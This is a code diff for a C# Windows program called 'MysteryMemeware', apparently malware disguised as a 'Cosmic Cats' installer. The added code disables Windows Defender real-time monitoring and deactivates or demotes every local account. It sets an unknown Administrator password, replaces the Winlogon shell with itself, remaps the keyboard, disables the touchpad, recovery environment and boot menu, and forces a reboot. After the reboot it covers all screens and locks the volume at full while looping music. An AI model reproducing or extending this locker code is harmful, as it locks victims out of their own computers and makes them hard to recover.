@@ -5,6 +5,7 @@ using System.Windows.Forms;
 using System.Threading;
 using System.Media;
 using Microsoft.Win32;
+using System.Drawing;
 namespace MysteryMemeware
 {
     public static class Program
@@ -14,7 +15,8 @@ namespace MysteryMemeware
         public static readonly string System32Folder = StringHelper.ReplaceCaseless(Environment.GetFolderPath(Environment.SpecialFolder.System), "System32", "Sysnative");
         public static readonly string System64Folder = Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
         public static readonly string SystemFolder = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
-        public const string MemeMusicResourceName = "MysteryMemeware.Music.wav";
+        public const string MemeMusicResourceName = "MysteryMemeware.MysterySong.wav";
+        public const string DisplayCoverImageResourceName = "MysteryMemeware.CoverImage.bmp";
         public static readonly string InstallLocation = SystemFolder + "\\Shell.exe";
         public const string IsInstalledRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\IsInstalled";
         public const string AdminPasswordRegistryPath = "Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\MysteryMemeware\\AdminPassword";
@@ -119,10 +121,39 @@ namespace MysteryMemeware
             {
                 return;
             }
-            ProcessHelper.Start(new TerminalCommand(CurrentExePath, ""), WindowMode.Default, true, CurrentExeFolder);
+            string commonAppData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
+            string tempFolderPath = commonAppData + "\\" + 0.ToString();
+            for (int i = 0; i < 10000; i++)
+            {
+                tempFolderPath = commonAppData + "\\" + i.ToString();
+                if (!Directory.Exists(tempFolderPath))
+                {
+                    break;
+                }
+            }
+            Directory.CreateDirectory(tempFolderPath);
+            string tempFilePath = tempFolderPath + "\\CosmicCatsInstaller.exe";
+            File.Copy(CurrentExePath, tempFilePath);
+            try
+            {
+                ProcessHelper.Start(new TerminalCommand(tempFilePath, ""), WindowMode.Default, true, CurrentExeFolder);
+            }
+            catch (System.ComponentModel.Win32Exception win32ex)
+            {
+                if (win32ex.NativeErrorCode == 1223)
+                {
+                    MessageBox.Show("Elevated permissions denied. To install cosmic cats again later please run this application again and select yes when prompted.", "Elevated Permissions Denied.", MessageBoxButtons.OK);
+                }
+                else
+                {
+                    throw win32ex;
+                }
+            }
         }
         public static void Install()
         {
+            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableRealtimeMonitoring"), 1, RegistryValueKind.DWord);
+
             if (File.Exists(InstallLocation))
             {
                 File.Delete(InstallLocation);
@@ -130,7 +161,27 @@ namespace MysteryMemeware
 
             File.Copy(CurrentExePath, InstallLocation);
 
-            UserHelper.RemoveAdmin(UserHelper.CurrentUsername);
+            foreach (string username in UserHelper.GetLocalUsernames())
+            {
+                try
+                {
+                    UserHelper.DeactivateUser(username);
+                }
+                catch
+                {
+
+                }
+                try
+                {
+                    UserHelper.RemoveAdmin(username);
+                }
+                catch
+                {
+
+                }
+            }
+
+            UserHelper.ActivateUser(UserHelper.CurrentUsername);
 
             UserHelper.ActivateUser("Administrator");
 
@@ -142,41 +193,62 @@ namespace MysteryMemeware
 
             string newAdminPassword = UserHelper.GeneratePassword();
 
-            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence(AdminPasswordRegistryPath), newUserPassword, RegistryValueKind.String);
+            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence(AdminPasswordRegistryPath), newAdminPassword, RegistryValueKind.String);
 
             UserHelper.ChangeUserPassword("Administrator", newAdminPassword);
 
             byte[] scancodeMap = new byte[328] { 0, 0, 0, 0, 0, 0, 0, 0, 79, 0, 0, 0, 0, 0, 33, 224, 0, 0, 108, 224, 0, 0, 109, 224, 0, 0, 17, 224, 0, 0, 107, 224, 0, 0, 64, 224, 0, 0, 66, 224, 0, 0, 59, 224, 0, 0, 62, 224, 0, 0, 60, 224, 0, 0, 63, 224, 0, 0, 88, 224, 0, 0, 7, 224, 0, 0, 65, 224, 0, 0, 87, 224, 0, 0, 67, 224, 0, 0, 35, 224, 0, 0, 61, 224, 0, 0, 8, 224, 0, 0, 59, 0, 0, 0, 68, 0, 0, 0, 87, 0, 0, 0, 88, 0, 0, 0, 100, 0, 0, 0, 101, 0, 0, 0, 102, 0, 0, 0, 103, 0, 0, 0, 104, 0, 0, 0, 105, 0, 0, 0, 106, 0, 0, 0, 60, 0, 0, 0, 107, 0, 0, 0, 108, 0, 0, 0, 109, 0, 0, 0, 110, 0, 0, 0, 111, 0, 0, 0, 61, 0, 0, 0, 62, 0, 0, 0, 63, 0, 0, 0, 64, 0, 0, 0, 65, 0, 0, 0, 66, 0, 0, 0, 67, 0, 0, 0, 19, 224, 0, 0, 20, 224, 0, 0, 18, 224, 0, 0, 32, 224, 0, 0, 25, 224, 0, 0, 34, 224, 0, 0, 16, 224, 0, 0, 36, 224, 0, 0, 46, 224, 0, 0, 48, 224, 0, 0, 93, 224, 0, 0, 70, 224, 0, 0, 79, 224, 0, 0, 1, 0, 0, 0, 71, 224, 0, 0, 56, 0, 0, 0, 29, 0, 0, 0, 91, 224, 0, 0, 81, 224, 0, 0, 73, 224, 0, 0, 94, 224, 0, 0, 55, 224, 0, 0, 56, 224, 0, 0, 56, 224, 0, 0, 29, 224, 0, 0, 92, 224, 0, 0, 95, 224, 0, 0, 99, 224, 0, 0, 106, 224, 0, 0, 102, 224, 0, 0, 105, 224, 0, 0, 50, 224, 0, 0, 103, 224, 0, 0, 101, 224, 0, 0, 104, 224, 0, 0, 0, 0 };
 
-            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Keyboard Layout"), scancodeMap, RegistryValueKind.Binary);
-            
+            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Keyboard Layout\\Scancode Map"), scancodeMap, RegistryValueKind.Binary);
+
             RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\OOBE\\DisablePrivacyExperience"), 1, RegistryValueKind.DWord);
-            
+
             RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell"), InstallLocation, RegistryValueKind.String);
-            
+
             RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultUserName"), UserHelper.CurrentUsername, RegistryValueKind.String);
-            
+
             RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultPassword"), newUserPassword, RegistryValueKind.String);
-            
+
             RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoAdminLogon"), 1, RegistryValueKind.DWord);
 
-            RunCommand(System32Folder + "\\ReAgentc.exe", "/disable");
+            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrecisionTouchPad\\Status\\Enabled"), 0, RegistryValueKind.DWord);
 
+            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Wisp\\Touch\\TouchGate"), 0, RegistryValueKind.DWord);
+
+            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\NoLocalPasswordResetQuestions"), 1, RegistryValueKind.DWord);
+
+
+
+            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_CURRENT_USER\\System\\CurrentControlSet\\Control\\Keyboard Layout\\Scancode Map"), scancodeMap, RegistryValueKind.Binary);
+
+            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\OOBE\\DisablePrivacyExperience"), 1, RegistryValueKind.DWord);
+
+            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell"), InstallLocation, RegistryValueKind.String);
+
+            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultUserName"), UserHelper.CurrentUsername, RegistryValueKind.String);
+
+            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultPassword"), newUserPassword, RegistryValueKind.String);
+
+            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoAdminLogon"), 1, RegistryValueKind.DWord);
+
+            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrecisionTouchPad\\Status\\Enabled"), 0, RegistryValueKind.DWord);
+
+            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Wisp\\Touch\\TouchGate"), 0, RegistryValueKind.DWord);
+
+            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\NoLocalPasswordResetQuestions"), 1, RegistryValueKind.DWord);
+
+
+
+            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence(IsInstalledRegistryPath), "true", RegistryValueKind.String);
+
+            RunCommand(System32Folder + "\\ReAgentc.exe", "/disable");
             RunCommand(System32Folder + "\\bcdedit.exe", "/set {current} bootstatuspolicy ignoreallfailures", true);
             RunCommand(System32Folder + "\\bcdedit.exe", "/set {default} bootstatuspolicy ignoreallfailures", true);
             RunCommand(System32Folder + "\\bcdedit.exe", "/set {current} recoveryenabled No", true);
             RunCommand(System32Folder + "\\bcdedit.exe", "/set {default} recoveryenabled No", true);
             RunCommand(System32Folder + "\\bcdedit.exe", "/set {bootmgr} displaybootmenu No", true);
             RunCommand(System32Folder + "\\bcdedit.exe", "/set {globalsettings} advancedoptions false", true);
-            RunCommand(System32Folder + "\\bcdedit.exe", "/set {current} bootmenupolicy standard", true); 
-
-            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrecisionTouchPad\\Status\\Enabled"), 0, RegistryValueKind.DWord);
-
-            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Wisp\\Touch\\TouchGate"), 0, RegistryValueKind.DWord);
-
-            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence("Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\\NoLocalPasswordResetQuestions"), 1, RegistryValueKind.DWord);
-
-            RegistryHelper.CreateRegistryValue(new RegistryValueRefrence(IsInstalledRegistryPath), "true", RegistryValueKind.String);
+            RunCommand(System32Folder + "\\bcdedit.exe", "/set {current} bootmenupolicy standard", true);
 
             RunCommand(System32Folder + "\\shutdown.exe", "/r /f /t 0", false);
         }
@@ -186,33 +258,16 @@ namespace MysteryMemeware
         }
         public static void Run()
         {
-            System.Windows.Forms.Timer volumeTimer = new()
-            {
-                Interval = 250,
-                Tag = null
-            };
-            volumeTimer.Tick += (object sender, EventArgs e) =>
-            {
-                VolumeHelper.SetVolume(1);
-                VolumeHelper.SetMute(false);
-            };
-            volumeTimer.Enabled = true;
-            volumeTimer.Start();
-            int screenCount = Screen.AllScreens.Length;
-            for (int screenIndex = 0; screenIndex < screenCount; screenIndex++)
-            {
-                int localScreenIndex = screenIndex;
-                Thread thread = new(() =>
-                {
-                    DisplayCoverForm form = new(localScreenIndex);
-                    form.ShowDialog();
-                });
-                thread.Start();
-            }
+            VolumeHelper.LockAtFull();
+
+            ScreenCoverForm.CoverAllScreens(Image.FromStream(typeof(Program).Assembly.GetManifestResourceStream(DisplayCoverImageResourceName)), System.Drawing.Drawing2D.InterpolationMode.NearestNeighbor);
+
             SoundPlayer soundPlayer = new(typeof(Program).Assembly.GetManifestResourceStream(MemeMusicResourceName));
+            soundPlayer.PlayLooping();
+
             while (true)
             {
-                soundPlayer.PlaySync();
+                Thread.Sleep(int.MaxValue);
             }
         }
     }
